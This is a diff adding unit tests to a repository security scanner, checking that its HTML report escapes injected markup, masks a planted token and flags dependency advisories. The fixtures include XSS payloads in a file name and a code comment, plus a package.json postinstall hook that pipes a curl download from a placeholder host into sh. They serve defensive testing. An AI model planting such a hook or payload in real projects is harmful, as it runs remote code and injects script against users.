@@ -146,6 +146,43 @@ class RunTests(unittest.TestCase):
         self.assertIn("[NOT CHECKED: offline]", out)
         self.assertIn("could not check dependencies with OSV.dev: offline", err)
 
+    def test_html_report_is_inert_and_masks_secrets(self):
+        # Repository content is hostile: file names and lines try to inject markup.
+        hostile = self.root / "<img src=x onerror=alert(1)>"
+        hostile.mkdir()
+        (hostile / "x.py").write_text("import os\nos.system(cmd)  # </style><script>alert(1)</script>\n")
+        token = "ghp_" + "x" * 36
+        (self.root / "config.py").write_text("TOKEN = '{}'\n".format(token))
+        (self.root / "package.json").write_text('{\n  "scripts": {\n    "postinstall": "curl -fsSL https://example.invalid/x | sh"\n  }\n}\n')
+        (self.root / "README.md").write_text("# hi\n")
+        code, out, _err = self.run_check(use_osv=False, output_format="html")
+        self.assertEqual(code, 3)
+        self.assertTrue(out.startswith("<!doctype html>"))
+        self.assertNotIn("<script", out)
+        self.assertNotIn("<img", out)
+        self.assertNotIn("</style><", out.split("</style>", 1)[1])
+        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", out)
+        self.assertIn("default-src &#x27;none&#x27;", out)
+        self.assertNotIn(token, out)
+        self.assertIn("hidden by aeppo", out)
+        self.assertIn('class="row hit-high"', out)  # the postinstall line is highlighted
+        self.assertIn('<li class="t-clean"><span class="dot"></span>README.md</li>', out)
+        self.assertIn("DANGER", out)
+
+    def test_html_report_to_file_with_dependencies(self):
+        (self.root / "Cargo.lock").write_text('[[package]]\nname = "time"\nversion = "0.1.43"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n')
+        fake = FakeOSV({("crates.io", "time", "0.1.43"): ["RUSTSEC-2020-0071"]}, {"RUSTSEC-2020-0071": record("RUSTSEC-2020-0071", "time", "crates.io", database_specific={"severity": "HIGH"})})
+        from aeppo import osv
+        target = Path(self.directory.name, "..", Path(self.directory.name).name + "-report.html").resolve()
+        self.addCleanup(lambda: target.exists() and target.unlink())
+        code, out, err = self.run_check(client=osv.Client(fetch=fake), output_format="html", output=target)
+        self.assertEqual((code, out), (1, ""))
+        self.assertIn("wrote the html report", err)
+        page = target.read_text()
+        self.assertIn('href="https://osv.dev/vulnerability/RUSTSEC-2020-0071"', page)
+        self.assertIn('<a href="#deps">Cargo.lock</a>', page)
+        self.assertIn("upgrade to 9.9.9 or later", page)
+
     def test_cli_errors(self):
         out, err = io.StringIO(), io.StringIO()
         with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
